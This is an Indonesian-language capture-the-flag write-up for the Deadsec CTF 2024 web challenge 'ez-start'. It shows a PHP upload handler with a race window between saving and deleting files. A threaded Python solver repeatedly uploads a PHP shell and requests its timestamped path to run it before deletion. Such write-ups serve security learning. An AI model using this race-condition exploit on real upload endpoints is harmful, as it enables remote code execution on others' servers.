# ez-start - Web - Deadsec CTF 2024
Pada challenge kali ini, kita dihadapkan dengan fitur upload, yang hanya mengizinkan `jpg, png, jpeg, dan gif`. namun kita tidak perlu terlalu memerhatikan extensi dari file, karena apapun file yang kita upload, file akan tetap terupload.

Kita akan memanfaatkan kerentanan `Race Condition` untuk membaca file flag.txt, saat file terupload dan pengecekan `is_malware` dan `is_image` terdapat rentang waktu dimana file `shell` kita bisa dieksekusi. dengan memanfaatkan `Race Condition`, kita bisa mengeksekusi file shell php kita dan membaca flag.

## Source Code
```php
<?php

session_start();

function is_malware($file_path)
{
    $content = file_get_contents($file_path);
    
    if (strpos($content, '<?php') !== false) {
        return true; 
    }
    
    return false;
}

function is_image($path, $ext)
{
    // Define allowed extensions
    $allowed_extensions = ['png', 'jpg', 'jpeg', 'gif'];
    
    // Check if the extension is allowed
    if (!in_array(strtolower($ext), $allowed_extensions)) {
        return false;
    }
    
    // Check if the file is a valid image
    $image_info = getimagesize($path);
    if ($image_info === false) {
        return false;
    }
    
    return true;
}

if (isset($_FILES) && !empty($_FILES)) {

    $uploadpath = "tmp/";
    
    $ext = pathinfo($_FILES["files"]["name"], PATHINFO_EXTENSION);
    $filename = basename($_FILES["files"]["name"], "." . $ext);

    $timestamp = time();
    $new_name = $filename . '_' . $timestamp . '.' . $ext;
    $upload_dir = $uploadpath . $new_name;

    if ($_FILES['files']['size'] <= 10485760) {
        move_uploaded_file($_FILES["files"]["tmp_name"], $upload_dir);
    } else {
        echo $error2 = "File size exceeds 10MB";
    }

    if (is_image($upload_dir, $ext) && !is_malware($upload_dir)){
        $_SESSION['context'] = "Upload successful";
    } else {
        $_SESSION['context'] = "File is not a valid image or is potentially malicious";
    }
    
    echo $upload_dir;
    unlink($upload_dir);
}

?>
```

Pada kode diatas, file yang kita upload akan disimpan dengan format `shell_{timestamp}.php`, kita tidak perlu memedulikan terkait `is_image` dan `is_malware`, karena apapun yang kita upload file akan disimpan di `/tmp` lalu di hapus. namun terdapat rentang waktu saat file di upload `move_uploaded_file();` dan penghapusan file `unlink($upload_dir);`. kita bisa memanfaatkan rentang waktu yang singkat tersebut untuk mengeksekusi `shell.php` sebelum file terhapus.

## Solver Code
```python
import httpx
import datetime
import threading
import os
import re

URL = 'https://5ff5201cf17538a49389c48c.deadsec.quest'
max_threads = 50

class BaseAPI:
    def __init__(self, url=URL):
        self.c = httpx.Client(base_url=url)

    def access_file(self, timestamp):
        file_name = f'/tmp/shell_{int(timestamp)}.php'
        response = self.c.get(file_name)
        res = response.text
        flag = re.findall(r"DEAD{.*}", res)
        if flag:
            print(f'here\'s ur flag {flag}')
            os.kill(os.getpid(), 9)

    def upload(self):
        with open('shell.php', 'rb') as file:
            files = {'files': ('shell.php', file, 'application/x-php')}
            response = self.c.post('/upload.php', files=files)

if __name__ == "__main__":
    api = BaseAPI()

    for i in range(50000):
        current_timestamp = int(datetime.datetime.now().timestamp())
        t1 = threading.Thread(target=api.access_file, args=(current_timestamp,))
        t2 = threading.Thread(target=api.upload)
        t1.start()
        t2.start()
        if threading.active_count() > max_threads:
            t1.join()
            t2.join()
            print('max_threads reached')
```
Thankyou